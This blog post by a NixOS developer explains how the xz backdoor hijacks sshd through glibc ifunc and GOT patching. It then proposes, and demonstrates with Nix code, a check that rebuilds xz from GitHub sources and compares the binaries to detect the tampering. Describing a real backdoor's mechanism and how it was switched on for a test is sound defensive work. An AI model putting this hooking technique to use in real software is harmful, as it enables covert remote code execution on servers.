<p>The <code>xz</code> backdoor uses a functionality of the <code>glibc</code> called <em>ifunc</em> to force execution of code during dynamic loading time: <em>ifunc</em> is designed to allow selection between several implementations of the same function at dynamic loading time.</p>
<pre tabindex="0"><code><span><span>#include</span><span> &lt;stdio.h&gt;</span></span>
<span></span>
<span><span>// Declaration of ifunc resolver function</span></span>
<span><span>int</span><span> (</span><span>*</span><span>resolve_add</span><span>(</span><span>void</span><span>))(</span><span>int</span><span>,</span><span> int</span><span>);</span></span>
<span></span>
<span><span>// First version of the add function</span></span>
<span><span>int</span><span> add_v1</span><span>(</span><span>int</span><span> a</span><span>,</span><span> int</span><span> b</span><span>)</span><span> {</span></span>
<span><span>    printf</span><span>(</span><span>"Using add_v1</span><span>\n</span><span>"</span><span>);</span></span>
<span><span>    return</span><span> a </span><span>+</span><span> b</span><span>;</span></span>
<span><span>}</span></span>
<span></span>
<span><span>// Second version of the add function</span></span>
<span><span>int</span><span> add_v2</span><span>(</span><span>int</span><span> a</span><span>,</span><span> int</span><span> b</span><span>)</span><span> {</span></span>
<span><span>    printf</span><span>(</span><span>"Using add_v2</span><span>\n</span><span>"</span><span>);</span></span>
<span><span>    return</span><span> a </span><span>+</span><span> b</span><span>;</span></span>
<span><span>}</span></span>
<span></span>
<span><span>// Resolver function that chooses the correct version of the function</span></span>
<span><span>int</span><span> (</span><span>*</span><span>resolve_add</span><span>(</span><span>void</span><span>))(</span><span>int</span><span>,</span><span> int</span><span>)</span><span> {</span></span>
<span><span>    // You can implement any runtime check here.</span></span>
<span><span>    // In that case we check if the system is 64bit</span></span>
<span><span>    if</span><span> (</span><span>sizeof</span><span>(</span><span>void</span><span>*</span><span>)</span><span> ==</span><span> 8</span><span>)</span><span> {</span></span>
<span><span>        return</span><span> add_v2</span><span>;</span></span>
<span><span>    }</span><span> else</span><span> {</span></span>
<span><span>        return</span><span> add_v1</span><span>;</span></span>
<span><span>    }</span></span>
<span><span>}</span></span>
<span></span>
<span><span>// Define the ifunc attribute for the add function</span></span>
<span><span>int</span><span> add</span><span>(</span><span>int</span><span> a</span><span>,</span><span> int</span><span> b</span><span>)</span><span> __attribute__</span><span>((</span><span>ifunc</span><span>(</span><span>"resolve_add"</span><span>)));</span></span>
<span></span>
<span><span>int</span><span> main</span><span>()</span><span> {</span></span>
<span><span>    int</span><span> result </span><span>=</span><span> add</span><span>(</span><span>10</span><span>,</span><span> 20</span><span>);</span></span>
<span><span>    printf</span><span>(</span><span>"Result: %d</span><span>\n</span><span>"</span><span>,</span><span> result</span><span>);</span></span>
<span><span>    return</span><span> 0</span><span>;</span></span>
<span><span>}</span></span>
<span></span></code></pre>

<p>In the above example, the <em>ifunc</em> attribute surrounding the <code>add</code> function indicates that the version that will be executed will be determined at dynamic loading time by running the <code>resolve_add</code> function. In that case, the <code>resolve_add</code> function returns <code>add_v1</code> or <code>add_v2</code> depending if the running system is a 64 bit system or not – and as such is completely harmless – but this technique is used by the <code>xz</code> backdoor to run some malicious code at dynamic loading time.</p>
<p><em>But dynamic loading of which program?</em> Well, of <code>ssh</code>! In some Linux distributions (Debian and Fedora for example), <code>ssh</code> is patched to support <code>systemd</code> notifications and for this purpose, links with <code>libsystemd</code>, that in turn links with <code>liblzma</code>. In those distribution <code>sshd</code> hence has a transitive dependency on <code>liblzma</code>.</p>
<figure id="fig:SED-HR4049">
<img src="https://luj.fr/assets/links.png">
<figcaption>Dependency chain between <code>sshd</code> and <code>liblzma</code></figcaption>
</figure>
<p>This is how the backdoor works: whenever <code>sshd</code> is executed, the dynamic loader loads <code>libsystemd</code> and then <code>liblzma</code>. With the backdoor installed, and leveraging the <em>ifunc</em> functionality as explained above, the backdoor is able to run arbitrary code when <code>liblzma</code> is being loaded. Indeed, as you remember from the previous section, the backdoor script modifies one of the legitimate <code>xz</code> object files: it actually modifies the resolver of one of the functions that uses <em>ifunc</em> to call its own malicious <code>_get_cpuid</code> symbol. When called, this function meddles with the GOT (that is not yet read-only at this time of execution) to modify the address of the <code>RSA_public_decrypt</code> function, replacing it by a malicious one! That’s it, at this point <code>sshd</code> uses the malicious <code>RSA_public_decrypt</code> function that gives RCE privileges to the attacker.</p>
<p>Once again, there exist more precise reports on exactly how the hooking happens that a curious reader might read, like <a href="https://securelist.com/xz-backdoor-story-part-1/112354/">this one</a> for example. There is also <a href="https://arxiv.org/pdf/2404.08987">a research article</a> summarizing the attack vector and possible mitigations that I recommend reading.</p>
<h2 id="avoiding-the-xz-catastrophe-in-the-future">Avoiding the <code>xz</code> catastrophe in the future</h2>
<p>What should our takeaways be from this near-miss and what should we do to minimize the risks of such an attack happening again in the future? Obviously, there is a lot to be said about the social issues at play here<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a> and how we can build better resilience in the OSS ecosystem against malicious entities taking over really fundamental OSS projects, but in this piece I’ll only address the technical aspects of the question.</p>
<p>People are often convinced that OSS is more trustworthy than closed-source software because the code can be audited by practitioners and security professionals in order to detect vulnerabilities or backdoors. In this instance, this procedure has been made difficult by the fact that part of the code activating the backdoor was not included in the sources available within the git repository but was instead present in the maintainer-provided tarball. While this was used to hide the backdoor out of sight of most investigating eyes, this is also an opportunity for us to improve our software supply chain security processes.</p>
<h2 id="building-software-from-trusted-sources">Building software from trusted sources</h2>
<p>One immediate observation that we can make in reaction to this supply chain incident is that it was only effective because a lot of distributions were using the maintainer provided tarball to build <code>xz</code> instead of the raw source code supplied by the git forge (in this case, GitHub). This reliance on release tarballs has plenty of historical and practical reasons:</p>
<ul>
<li>the tarball workflow predates the existence of <code>git</code> and was used in the earliest Linux distributions;</li>
<li>tarballs are self-contained archives that encapsulate the exact state of the source code intended for release while git repositories can be altered, creating the need for a snapshot of the code;</li>
<li>tarballs can contain intermediary artifacts (for example manpages) used to lighten the build process, or configure scripts to target specific hardware, etc;</li>
<li>tarballs allow the source code to be compressed which is useful for space efficiency.</li>
</ul>
<p>This being said, these reasons do not weigh enough in my opinion to justify the security risks they create. In all places where it is technically feasible, we should build software from sources authenticated by the most trustworthy party. For example, if a project is developed on GitHub, an archive is automatically generated by GitHub for each release. The risk of a compromise of that release archive is far lower than the risk of a malicious maintainer distributing unfaithful tarballs, as it would require compromising the GitHub infrastructure (and at this point the problem is much more serious). This reasoning can be extended in all cases where the development is happening on a platform operated by a trusted third party like Codeberg/SourceHut/Gitlab, etc.</p>
<h3 id="when-the-situation-allows-it">When the situation allows it…</h3>
<p><strong>NixOS</strong> is a distribution built on the functional package management model, that is to say every package is encoded as an expression written in Nix, a functional programming language. A Nix expression for a software project is usually a function mapping all the project dependencies to a “build recipe” that can be later executed to build the package. I am a NixOS developer and I was surprised when the backdoor was revealed to see that the malicious version of <code>xz</code> had ended up being distributed to our users<a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a>. While there is no policy about this, there is a culture among NixOS maintainers of using the source archive automatically generated by GitHub (that are simply snapshots of the source code) when available through the <code>fetchFromGitHub</code> function. In the simplified example of the <code>xz</code> package below, you can see that the sources for the package are actually extracted from the manually uploaded <em>malicious</em> maintainer provided tarball through another source fetcher: <code>fetchurl</code>.</p>
<pre tabindex="0"><code><span><span>{</span><span> lib</span><span>,</span><span> stdenv</span><span>,</span><span> fetchurl</span></span>
<span><span>,</span><span> enableStatic</span><span> ?</span><span> stdenv</span><span>.</span><span>hostPlatform</span><span>.</span><span>isStatic</span></span>
<span><span>}:</span></span>
<span></span>
<span><span>stdenv</span><span>.</span><span>mkDerivation </span><span>rec</span><span> {</span></span>
<span><span>  pname</span><span> =</span><span> "xz"</span><span>;</span></span>
<span><span>  version</span><span> =</span><span> "5.6.0"</span><span>;</span></span>
<span></span>
<span><span>  src</span><span> =</span><span> fetchurl </span><span>{</span></span>
<span><span>    url</span><span> =</span><span> "https://github.com/tukaani-project/xz/releases/download/v</span><span>${</span><span>version</span><span>}</span><span>/xz-</span><span>${</span><span>version</span><span>}</span><span>.tar.xz"</span><span>;</span></span>
<span><span>    hash</span><span> =</span><span> "sha256-AWGCxwu1x8nrNGUDDjp/a6ol4XsOjAr+kncuYCGEPOI="</span><span>;</span></span>
<span><span>  };</span></span>
<span><span>...</span></span>
<span><span>}</span></span>
<span></span></code></pre>

<p>To understand why, we must first talk about the bootstrap of <code>nixpkgs</code>. The concept of a bootstrap is the idea that one could rebuild all of the packages in <code>nixpkgs</code> from a small set of seed binaries. This is an important security property because it means that there are no other external tools that one must trust in order to trust the toolchain that is used to build the software distribution. What we call the “bootstrap” in the context of a software distribution like <code>nixpkgs</code>, is all the steps needed to build the basic compilation environment to be used by other packages, called <code>stdenv</code> in nixpkgs. Building <code>stdenv</code> is not an easy task; how does one build <code>gcc</code> when one doesn’t even have a C compiler? The answer is that you start from a very small binary that does nothing fancy but is enough to build <code>hex</code>, a minimalist assembler, which in turn can build a more complex assembler, and this until we are able to build more complex software and finally a modern C compiler. The bootstraping story of Nix/Guix is an incredibly interesting topic, that I will not cover extensively here, but I strongly advise reading blog posts from the Guix community, that are on the bleeding edge (they have <a href="https://guix.gnu.org/en/blog/2023/the-full-source-bootstrap-building-from-source-all-the-way-down/">introduced a 357-byte bootstrap</a> that is being adapted for nixpkgs).</p>
<p>What does all that has to do with <code>xz</code> though? Well, <code>xz</code> is included in the nixpkgs bootstrap!</p>
<pre tabindex="0"><code><span><span>$</span><span> nix-build -A stdenv</span></span>
<span><span>/nix/store/91d27rjqlhkzx7mhzxrir1jcr40nyc7p-stdenv-linux</span></span>
<span><span>$</span><span> nix-store --query --graph result</span></span>
<span></span></code></pre>

<p><img src="https://luj.fr/assets/runtime.png"></p>
<p>We can see now that <code>stdenv</code> depends at runtime on <code>xz</code>, so it is indeed built during the bootstrap stage. To understand a bit more why this is the case, I’ll also generate a graph of the software in <code>stdenv</code> that depends on <code>xz</code> at buildtime.</p>
<pre tabindex="0"><code><span><span>$</span><span> nix-store --query --graph </span><span>$(</span><span>nix-eval</span><span> --raw</span><span> -f</span><span> default</span><span> stdenv.drvPath</span><span>)</span></span>
<span></span></code></pre>

<p><img src="https://luj.fr/assets/buildtime.png"></p>
<p>We can see that several packages depend on <code>xz</code>. Let’s take <code>coreutils</code> for example and try to understand why it depends on <code>xz</code> by reading its derivation file, which is the intermediary representation of the build process obtained by evaluating the Nix expression for <code>coreutils</code>:</p>
<pre tabindex="0"><code><span><span>{</span></span>
<span><span>  "</span><span>/nix/store/57hlz5fnvfgljivf7p18fmcl1yp6d29z-coreutils-9.5.drv</span><span>"</span><span>:</span><span> {</span></span>
<span><span>    "</span><span>args</span><span>"</span><span>:</span><span> [</span></span>
<span><span>      "-e"</span><span>,</span></span>
<span><span>      "/nix/store/v6x3cs394jgqfbi0a42pam708flxaphh-default-builder.sh"</span></span>
<span><span>    ],</span></span>
<span><span>    "</span><span>builder</span><span>"</span><span>:</span><span> "/nix/store/razasrvdg7ckplfmvdxv4ia3wbayr94s-bootstrap-tools/bin/bash"</span><span>,</span></span>
<span></span>
<span><span>      ...</span></span>
<span></span>
<span><span>    "</span><span>inputDrvs</span><span>"</span><span>:</span><span> {</span></span>
<span></span>
<span><span>      ...</span></span>
<span></span>
<span><span>      "</span><span>/nix/store/c0wk92pcxbxi7579xws6bj12mrim1av6-xz-5.6.2.drv</span><span>"</span><span>:</span><span> {</span></span>
<span><span>        "</span><span>dynamicOutputs</span><span>"</span><span>:</span><span> {},</span></span>
<span><span>        "</span><span>outputs</span><span>"</span><span>:</span><span> [</span></span>
<span><span>          "bin"</span></span>
<span><span>        ]</span></span>
<span><span>      },</span></span>
<span><span>      "</span><span>/nix/store/xv4333kfggq3zn065a3pwrj7ddbs4vzg-coreutils-9.5.tar.xz.drv</span><span>"</span><span>:</span><span> {</span></span>
<span><span>        "</span><span>dynamicOutputs</span><span>"</span><span>:</span><span> {},</span></span>
<span><span>        "</span><span>outputs</span><span>"</span><span>:</span><span> [</span></span>
<span><span>          "out"</span></span>
<span><span>        ]</span></span>
<span><span>      }</span></span>
<span><span>    },</span></span>
<span></span>
<span><span>    ...</span></span>
<span></span>
<span><span>    "</span><span>system</span><span>"</span><span>:</span><span> "x86_64-linux"</span></span>
<span><span>  }</span></span>
<span><span>}</span></span>
<span></span>
<span></span></code></pre>

<p>The <code>inputDrvs</code> field here correspond to all the other packages or expressions that the <code>coreutils</code> build process depends on. We see that in particular it depends on two components:</p>
<ul>
<li><code>/nix/store/c0wk92pcxbxi7579xws6bj12mrim1av6-xz-5.6.2.drv</code>, which is <code>xz</code> itself;</li>
<li><code>/nix/store/xv4333kfggq3zn065a3pwrj7ddbs4vzg-coreutils-9.5.tar.xz.drv</code> which is a source archive for <code>coreutils</code>! As it is a <code>.xz</code> archive, we need <code>xz</code> to unpack it and that is where the dependency comes from!</li>
</ul>
<p>The same reasoning applies to the other three direct dependencies that we could see in the graph earlier.</p>
<p><code>xz</code> being built as part of the bootstrap means it doesn’t have access to all the facilities normal packages in nixpkgs can rely on. In particular it can only access packages that are built <em>before</em> in bootstrap. For example, to build <code>xz</code> from sources, we need <code>autoconf</code> to generate the configure script. But <code>autoconf</code> has a dependency on <code>xz</code>! Using the maintainer tarball allows us to break this dependency cycle.</p>
<pre tabindex="0"><code><span><span>$</span><span> nix why-depends --derivation nixpkgs#autoconf nixpkgs#xz</span></span>
<span><span>/nix/store/2rajzdx3wkivlc38fyhj0avyp10k2vjj-autoconf-2.72.drv</span></span>
<span><span>└───/nix/store/jnnb5ihdh6r3idmqrj2ha95ir42icafq-stdenv-linux.drv</span></span>
<span><span>    └───/nix/store/sqwqnilfwkw6p2f5gaj6n1xlsy054fnw-xz-5.6.4.drv</span></span>
<span></span></code></pre>

<p>In conclusion, at the point in the <code>nixpkgs</code> graph where the <code>xz</code> package is built, the GitHub source archive cannot be used and we have to rely on the maintainer provided tarball, and hence, trust it. That does not mean that further verification cannot be implemented in <code>nixpkgs</code>, though…</p>
<h2 id="building-trust-into-untrusted-release-tarballs">Building trust into untrusted release tarballs</h2>
<p>To recap, the main reason that made NixOS vulnerable to the <code>xz</code> attack is that it is built as part of the bootstrap phase, at a point where we rely on maintainer-provided tarballs instead of the ones generated by GitHub. This incident shows that we should have specific protections in place, to ensure software built as part of our bootstrap is trustworthy.</p>
<h3 id="by-comparing-sources">1. By comparing sources</h3>
<p>One idea that comes to mind is that it should be easy, as a distribution, to verify that the sources tarballs we are using are indeed identical to the GitHub ones. There was even <a href="https://github.com/NixOS/nixpkgs/pull/300542">a pull request opened to introduce such a protection scheme</a>. While this seem like a natural idea, it doesn’t really work in practice: it’s not that rare that the maintainer provided tarball differs from the sources, and it’s often nothing to worry about.</p>
<blockquote data-embed-url="https://mastodon.social/@bagder/112181123475212554/embed"> <a href="https://mastodon.social/@bagder/112181123475212554" target="_blank"> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 79 75"><path d="M74.7135 16.6043C73.6199 8.54587 66.5351 2.19527 58.1366 0.964691C56.7196 0.756754 51.351 0 38.9148 0H38.822C26.3824 0 23.7135 0.756754 22.2966 0.964691C14.1319 2.16118 6.67571 7.86752 4.86669 16.0214C3.99657 20.0369 3.90371 24.4888 4.06535 28.5726C4.29578 34.4289 4.34049 40.275 4.877 46.1075C5.24791 49.9817 5.89495 53.8251 6.81328 57.6088C8.53288 64.5968 15.4938 70.4122 22.3138 72.7848C29.6155 75.259 37.468 75.6697 44.9919 73.971C45.8196 73.7801 46.6381 73.5586 47.4475 73.3063C49.2737 72.7302 51.4164 72.086 52.9915 70.9542C53.0131 70.9384 53.0308 70.9178 53.0433 70.8942C53.0558 70.8706 53.0628 70.8445 53.0637 70.8179V65.1661C53.0634 65.1412 53.0574 65.1167 53.0462 65.0944C53.035 65.0721 53.0189 65.0525 52.9992 65.0371C52.9794 65.0218 52.9564 65.011 52.9318 65.0056C52.9073 65.0002 52.8819 65.0003 52.8574 65.0059C48.0369 66.1472 43.0971 66.7193 38.141 66.7103C29.6118 66.7103 27.3178 62.6981 26.6609 61.0278C26.1329 59.5842 25.7976 58.0784 25.6636 56.5486C25.6622 56.5229 25.667 56.4973 25.6775 56.4738C25.688 56.4502 25.7039 56.4295 25.724 56.4132C25.7441 56.397 25.7678 56.3856 25.7931 56.3801C25.8185 56.3746 25.8448 56.3751 25.8699 56.3816C30.6101 57.5151 35.4693 58.0873 40.3455 58.086C41.5183 58.086 42.6876 58.086 43.8604 58.0553C48.7647 57.919 53.9339 57.6701 58.7591 56.7361C58.8794 56.7123 58.9998 56.6918 59.103 56.6611C66.7139 55.2124 73.9569 50.665 74.6929 39.1501C74.7204 38.6967 74.7892 34.4016 74.7892 33.9312C74.7926 32.3325 75.3085 22.5901 74.7135 16.6043ZM62.9996 45.3371H54.9966V25.9069C54.9966 21.8163 53.277 19.7302 49.7793 19.7302C45.9343 19.7302 44.0083 22.1981 44.0083 27.0727V37.7082H36.0534V27.0727C36.0534 22.1981 34.124 19.7302 30.279 19.7302C26.8019 19.7302 25.0651 21.8163 25.0617 25.9069V45.3371H17.0656V25.3172C17.0656 21.2266 18.1191 17.9769 20.2262 15.568C22.3998 13.1648 25.2509 11.9308 28.7898 11.9308C32.8859 11.9308 35.9812 13.492 38.0447 16.6111L40.036 19.9245L42.0308 16.6111C44.0943 13.492 47.1896 11.9308 51.2788 11.9308C54.8143 11.9308 57.6654 13.1648 59.8459 15.568C61.9529 17.9746 63.0065 21.2243 63.0065 25.3172L62.9996 45.3371Z" fill="currentColor"></path></svg> <p>Post by @bagder@mastodon.social</p> <p>View on Mastodon</p> </a> </blockquote> 

<p>As Daniel Stenberg (the maintainer of <code>curl</code>) explains, the release tarball being different than the source is a <em>feature</em>: it allows the maintainer to include intermediary artifacts like manpages or configure scripts for example (this is especially useful for distributions that want to get rid of the dependency on <code>autoconf</code> to build the program). Of course when we care about software supply chain security, this flexibility that project maintainers have in the way they provide the release assets is actually a liability because it forces us to trust them to do it honestly.</p>
<h3 id="leveraging-bitwise-reproducibility">2. Leveraging bitwise reproducibility</h3>
<p><strong>Reproducible builds</strong> is a property of a software project that is verified if building it twice in the same conditions yields the exact same (bitwise identical) artifacts. Build reproducibility is not something easy to obtain, as there are all kinds of nondeterminisms that can happen in build processes, and making as many packages as possible reproducible is the purpose of the <a href="https://reproducible-builds.org/">reproducible-builds</a> group. It is also a property recognized as instrumental to increase the trust in the distribution of binary artifacts (see <a href="https://arxiv.org/abs/2104.06020">Reproducible Builds: Increasing the Integrity of Software Supply Chains</a> for a detailed report).</p>
<p>There are several ways bitwise reproducibility could be used to build up trust in untrusted maintainer provided tarballs:</p>
<ol>
<li><p>Reproducibly building the tarball</p>
<p>A first approach that has been <a href="https://peter.eisentraut.org/blog/2024/08/13/the-new-postgresql-17-make-dist">adopted by the postgresql project</a> is to make the tarball generation process reproducible. This allows any user (or a linux distribution) to independently verify that the maintainer provided tarball was honestly generated from the original source code.</p>
<p><img src="https://luj.fr/assets/reproducible-tarball.png"></p>
<p>With this method, you can keep some advantages of building from tarballs (including the tarball containing some intermediary build artifacts like manpages or configure scripts). However, the drawback of this approach for software supply chain security is that it has to be implemented by upstream project maintainers. This means that adoption of this kind of security feature will probably be slow in the FOSS community, and while it is a good practice to make <em>everything</em> reproducible, including the tarball generation process, this is not the most effective way to increase software supply chain security <em>today</em>.</p></li>
<li><p>Checking for build convergence between various starting assets</p>



<p>Assuming <code>xz</code> is bitwise reproducible (and that is indeed the case), and that the maintainer provided tarball doesn’t contain any modification that impacts the build process, building it from the GitHub tarball or from the maintainer provided tarball <em>should</em> produce the same artifacts, right? Based on this idea, my proposal is to build <code>xz</code> a second time <em>after</em> the bootstrap, this time using the GitHub tarball (which is only possible after the bootstrap). If both builds differ we can suspect that there a suspicion of a supply chain compromise.</p>
<figure id="fig:SED-HR4049">
<img src="https://luj.fr/assets/sumary-method.png">
<figcaption>Summary of the method I propose to detect vulnerable <code>xz</code> source tarballs</figcaption>
</figure>
<p>Let’s see how this could be implemented:</p>
<p>First, we rewrite the <code>xz</code> package, this time using the <code>fetchFromGitHub</code> function. I create a <code>after-boostrap.nix</code> file alongside the original <code>xz</code> expression in the <code>pkgs/tools/compression/xz</code> directory of <code>nixpkgs</code>:</p>
<pre tabindex="0"><code><span><span>  {</span></span>
<span><span>  lib</span><span>,</span></span>
<span><span>  stdenv</span><span>,</span></span>
<span><span>  fetchurl</span><span>,</span></span>
<span><span>  enableStatic</span><span> ?</span><span> false</span><span>,</span></span>
<span><span>  writeScript</span><span>,</span></span>
<span><span>  fetchFromGitHub</span><span>,</span></span>
<span><span>  testers</span><span>,</span></span>
<span><span>  gettext</span><span>,</span></span>
<span><span>  autoconf</span><span>,</span></span>
<span><span>  libtool</span><span>,</span></span>
<span><span>  automake</span><span>,</span></span>
<span><span>  perl538Packages</span><span>,</span></span>
<span><span>  doxygen</span><span>,</span></span>
<span><span>  xz</span><span>,</span></span>
<span><span>}:</span></span>
<span></span>
<span><span>stdenv</span><span>.</span><span>mkDerivation </span><span>(</span><span>finalAttrs</span><span>:</span><span> {</span></span>
<span><span>  pname</span><span> =</span><span> "xz"</span><span>;</span></span>
<span><span>  version</span><span> =</span><span> "5.6.1"</span><span>;</span></span>
<span></span>
<span><span>  src</span><span> =</span><span> fetchFromGitHub </span><span>{</span></span>
<span><span>    owner</span><span> =</span><span> "tukaani-project"</span><span>;</span></span>
<span><span>    repo</span><span> =</span><span> "xz"</span><span>;</span></span>
<span><span>    rev</span><span> =</span><span> "v</span><span>${</span><span>finalAttrs</span><span>.</span><span>version</span><span>}</span><span>"</span><span>;</span></span>
<span><span>    hash</span><span> =</span><span> "sha256-alrSXZ0KWVlti6crmdxf/qMdrvZsY5yigcV9j6GIZ6c="</span><span>;</span></span>
<span><span>  };</span></span>
<span></span>
<span><span>  strictDeps</span><span> =</span><span> true</span><span>;</span></span>
<span><span>  configureFlags</span><span> =</span><span> lib</span><span>.</span><span>optional enableStatic </span><span>"--disable-shared"</span><span>;</span></span>
<span><span>  enableParallelBuilding</span><span> =</span><span> true</span><span>;</span></span>
<span><span>  doCheck</span><span> =</span><span> true</span><span>;</span></span>
<span></span>
<span><span>  nativeBuildInputs</span><span> =</span><span> [</span></span>
<span><span>    gettext</span></span>
<span><span>    autoconf</span></span>
<span><span>    libtool</span></span>
<span><span>    automake</span></span>
<span><span>    perl538Packages</span><span>.</span><span>Po4a</span></span>
<span><span>    doxygen</span></span>
<span><span>    perl</span></span>
<span><span>  ];</span></span>
<span></span>
<span><span>  preConfigure</span><span> =</span><span> ''</span></span>
<span><span>    ./autogen.sh</span></span>
<span><span>  ''</span><span>;</span></span>
<span></span>
<span><span>})</span></span>
<span></span></code></pre>

<p>I removed details here to focus on the most important: the Nix expression is very similar to the actual derivation for <code>xz</code>, the only difference (apart from the method to fetch the source) is that we need to use <code>autoconf</code> to generate configure scripts. When using the maintainer provided tarball these are already pre-generated for us (as Daniel Stenberg was explaining in the toot above) – which is very handy particularly when you are building <code>xz</code> in the bootstrap phase of a distribution and you don’t want a dependency on <code>autoconf</code> / <code>automake</code> – but in this instance we have to do it ourselves.</p>
<p>Now that we can build <code>xz</code> from the code archive provided by GitHub, we have to write Nix code to compare both outputs. For that purpose, we register a new phase called <code>compareArtifacts</code>, that runs at the very end of the build process. To make my point, I’ll first only compare the <code>liblzma.so</code> file (the one that was modified by the backdoor), but we could easily generalize this phase to all binaries and libraries outputs:</p>
<pre tabindex="0"><code><span><span>postPhases = </span><span>[</span><span> "compareArtifacts"</span><span> ]</span><span>;</span></span>
<span></span>
<span><span>compareArtifacts = </span><span>''</span></span>
<span><span>  diff $out/lib/liblzma.so </span><span>${</span><span>xz</span><span>.</span><span>out</span><span>}</span><span>/lib/liblzma.so</span></span>
<span><span>''</span><span>;</span></span>
<span></span></code></pre>

<p>After this change, building <code>xz-after-bootstrap</code> on master<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a> still works, showing that in a normal setting, both artifacts are indeed identical.</p>
<pre tabindex="0"><code><span><span>$</span><span> nix-build -A xz-after-bootstrap</span></span>
<span><span>/nix/store/h23rfcjxbp1vqmmbvxkv0f69r579kfc1-xz-5.6.1</span></span>
<span></span></code></pre>

<p>Let’s now try our detection method on the backdoored <code>xz</code> and see what happens! We checkout revision <code>c53bbe3</code> that contains the said version<a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a>, and build <code>xz-after-bootstrap</code>.</p>
<pre tabindex="0"><code><span><span>$</span><span> git checkout c53bbe3</span></span>
<span><span>$</span><span> nix-build -A xz-after-boostrap</span></span>
<span><span>/nix/store/57p62d3m98s2bgma5hcz12b4vv6nhijn-xz-5.6.1</span></span>
<span></span></code></pre>

<p>Again, identical artifacts? Remember that the backdoor was not active in NixOS, partly because there is a check that the <code>RPM_ARCH</code> variable is set in the script that installs the backdoor. So let’s set it in <code>pkgs/tools/compression/xz/default.nix</code> to activate the backdoor<a href="#fn5" id="fnref5" role="doc-noteref"><sup>5</sup></a>.</p>
<pre tabindex="0"><code><span><span>env</span><span>.</span><span>RPM_ARCH = </span><span>true</span><span>;</span></span>
<span></span></code></pre>

<pre tabindex="0"><code><span><span>$</span><span> nix-build -A xz-after-boostrap</span></span>
<span><span>/nix/store/57p62d3m98s2bgma5hcz12b4vv6nhijn-xz-5.6.1</span></span>
<span><span>...</span></span>
<span><span>...</span></span>
<span><span>Running phase: compareBins</span></span>
<span><span>Binary files /nix/store/cxz8iq3hx65krsyraill6figp03dk54n-xz-5.6.1/lib/liblzma.so and /nix/store/4qp2khyb22hg6a3jiy4hqmasjinfkp2g-xz-5.6.1/lib/liblzma.so differ</span></span>
<span></span></code></pre>

<p>That’s it, binary artifacts are different now! Let’s try to understand a bit more what makes them different by keeping them as part of the output. For that, we modify the <code>compareArtifacts</code> phase:</p>
<pre tabindex="0"><code><span><span>compareArtifacts = </span><span>''</span></span>
<span><span>  cp </span><span>${</span><span>xz</span><span>.</span><span>out</span><span>}</span><span>/lib/liblzma.so $out/xzBootstrap</span></span>
<span><span>  cp $out/lib/liblzma.so $out/xzAfterBootstrap</span></span>
<span><span>  diff $out/lib/liblzma.so </span><span>${</span><span>xz</span><span>.</span><span>out</span><span>}</span><span>/lib/liblzma.so || true</span></span>
<span><span>''</span><span>;</span></span>
<span></span></code></pre>

<p>This time the diff doesn’t make the build fail and we store both versions of the <code>liblzma.so</code> to be able to compare them afterwards.</p>
<pre tabindex="0"><code><span><span>$</span><span> ls -lah result</span></span>
<span><span>total 69M</span></span>
<span><span>dr-xr-xr-x      6 root root     99 Jan  1  1970 .</span></span>
<span><span>drwxrwxr-t 365666 root nixbld  85M Dec 10 14:27 ..</span></span>
<span><span>dr-xr-xr-x      2 root root   4.0K Jan  1  1970 bin</span></span>
<span><span>dr-xr-xr-x      3 root root     32 Jan  1  1970 include</span></span>
<span><span>dr-xr-xr-x      3 root root    103 Jan  1  1970 lib</span></span>
<span><span>dr-xr-xr-x      4 root root     31 Jan  1  1970 share</span></span>
<span><span>-r-xr-xr-x      1 root root   210K Jan  1  1970 xzAfterBootstrap</span></span>
<span><span>-r-xr-xr-x      1 root root   258K Jan  1  1970 xzBootstrap</span></span>
<span></span></code></pre>

<p>We can notice that there is even a significant size difference between the two artifacts with an increase of 48Kb for the backdoored one. Let’s try to understand where this difference comes from. We can use the <code>nm</code> command from <code>binutils</code> to list the symbols in an artifact:</p>
<pre tabindex="0"><code><span><span>$</span><span> nm result/xzAfterBootstrap</span></span>
<span><span>000000000000d3b0 t alone_decode</span></span>
<span><span>000000000000d380 t alone_decoder_end</span></span>
<span><span>000000000000d240 t alone_decoder_memconfig</span></span>
<span><span>0000000000008cc0 t alone_encode</span></span>
<span><span>0000000000008c90 t alone_encoder_end</span></span>
<span><span>0000000000008db0 t alone_encoder_init</span></span>
<span><span>0000000000020a80 t arm64_code</span></span>
<span><span>0000000000020810 t arm_code</span></span>
<span><span>0000000000020910 t armthumb_code</span></span>
<span><span>000000000000d8d0 t auto_decode</span></span>
<span><span>000000000000d8a0 t auto_decoder_end</span></span>
<span><span>000000000000d730 t auto_decoder_get_check</span></span>
<span><span>000000000000d7a0 t auto_decoder_init</span></span>
<span><span>000000000000d750 t auto_decoder_memconfig</span></span>
<span><span>0000000000022850 r available_checks.1</span></span>
<span><span>00000000000225f0 r bcj_optmap</span></span>
<span><span>0000000000008fb0 t block_buffer_encode</span></span>
<span><span>...</span></span>
<span></span></code></pre>

<p>Now we can diff the symbols between the two artifacts:</p>
<pre tabindex="0"><code><span><span>$ diff -u0 &lt;(nm --format=just-symbols xzAfterBootstrap) &lt;(nm --format=just-symbols xzBootstrap)</span></span>
<span><span>--- /dev/fd/63	2024-12-10 15:27:11.477332683 +0000</span></span>
<span><span>+++ /dev/fd/62	2024-12-10 15:27:11.478332717 +0000</span></span>
<span><span>@@</span><span> -31,0 +32 </span><span>@@</span></span>
<span><span>+</span><span>_cpuid</span></span>
<span><span>@@</span><span> -65,0 +67 </span><span>@@</span></span>
<span><span>+</span><span>_get_cpuid</span></span>
<span><span>@@</span><span> -448,0 +451 </span><span>@@</span></span>
<span><span>+</span><span>__tls_get_addr@GLIBC_2.3</span></span>
<span></span></code></pre>

<p>TADA! We see the added <code>_get_cpuid</code> symbol, documented in numerous technical report about the <code>xz</code> backdoor, confirming our method works!</p>
<p><strong>Addendum 1: How to implement this safeguard in <code>nixpkgs</code>?</strong></p>
<p>I think <code>nixpkgs</code> should implement this kind of safeguard for every package built as part of the bootstrap phase that is not using a trusted source archive. The <code>*-after-bootstrap</code> packages could then be added to the channel blockers to ensure that there is big red alarm that requires intervention from the maintainers if ever one of those would not build.</p>
